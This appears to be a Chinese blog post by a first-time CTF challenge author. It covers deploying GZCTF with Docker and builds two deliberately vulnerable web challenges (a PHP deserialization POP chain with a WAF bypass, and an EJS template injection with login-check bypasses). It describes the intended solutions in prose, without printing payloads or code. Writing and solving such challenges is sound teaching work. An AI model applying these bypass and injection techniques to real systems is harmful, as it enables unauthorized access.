记录一下第一次当CTF出题人

0x01 基于GZCTF的比赛平台搭建

1.1 测试服务器（ubantu）环境准备

  • Docker
  • docker-compose

1.2 GZCTF平台部署

github地址：https://github.com/GZTimeWalker/GZCTF

手册：https://docs.ctf.gzti.me/

步骤：

在服务器新建一个目录用来放GZCTF的核心配置文件appsettings.json和docker-compose.yml文件

  • appsettings.json

这里比较重要的是要确认好数据库密码和服务器地址

  • docker-compose.yml

这里比较重要的则是数据库密码和上面对应，然后设置好管理员密码，账号默认Admin

编辑好后在该目录下docker-compose一键启动即可

访问服务器80端口，管理员账号密码：Admin/<docker-compose.yml里设置的密码>，即可登录

2.1.1 Study_And_Share

考点：php反序列化pop链构造，双写绕waf

本题源自[2023羊城杯]D0n’t pl4y g4m3!!!，考虑到是院赛，院里打CTF的同学并不多，所以二开的时候尽量去除了一些冗余的代码和干扰项，保留了核心考点，然后加了一个文件包含读取waf源码的简单考点

2.1.1.1 源码

  • index.php
  • waf.php
  • hint.php

2.1.1.2 wp

主要是__get和__call魔法函数的利用，然后还需要注意一些php的小知识，对于源码中出现过但是没声明过的属性我们在构造exp的时候可以自己创建（也是这一点让这一题出现了原题也有的非预期），这里只放预期解

2.1.2 登录得flag

此题考查的是2023ciscn华南分区赛中出现的考点，考察的是ejs模板引擎注入和nodejs里emoji字符的编码问题，比较有意思的一道题

2.1.2.1 源码

  • app.js

2.1.2.2 wp

  • 账号处绕过

账号校验处可以用js中数组的特性绕过 (需要用json格式传)

代码中发现当我们登录成功时我们传入的username会被pug模板渲染出来，结合前面引入的ejs，可以判断出考查的模板注入，由于没有任何限制，所以直接利用网上的payload就行（这里要配合pug模板的#{}来插入变量）

在该payload前面加上admin和利用我们上一步提到的特性即可绕过检测。

  • 密码处绕过

js 采用的是 Unicode 字符集，UTF-16 编码，一个 emoji 表情是两个字符编码组成的

密码校验处其实就是少校验了原密码的第一个字符和最后一个字符，所以对应的我们要保留原密码第一个emoji表情的后一位字符和最后一个emoji表情的前一位字符

我们可以利用charCodeAt方法结合toString方法输出所需字符的Unicode编码

最终构造出json格式的payload

回到admin目录即可看到flag

0x03 题目部署

平台搭建好后在管理界面可以新建比赛，根据需求设置好各项数值后，来到编辑题目处新建题目，以web的Study_And_Share为例

填好基础信息后进入到题目编辑界面，这里比较重要的是容器镜像这里

我们使用的是github上开源的docker模板：https://github.com/CTF-Archives/ctf-docker-template

而这道题只需要一个nginx加php的基础环境就可以了，所以将该模板下载下来把源码加到src目录即可

由于题目有一个文件包含考点，为了不给非预期读flag，还需要修改service目录下的docker-entrypoint.sh文件，自定义flag名称

然后将题目环境上传至服务器，然后在题目的Dockerfile目录下指定镜像名字构造容器镜像（注意名字要全小写，否则会报错）

然后回到上一步将对应的镜像名字填上去即可，点击开启测试容器，就可以看到生成了测试入口

进去测试一下

然后这里显示的默认flag模板，我们可以自己去题目信息那里改

保存重开测试容器即可

0x04 总结

圆了出题梦，虽然只是院赛，但是也算是学校的第一个CTF比赛了
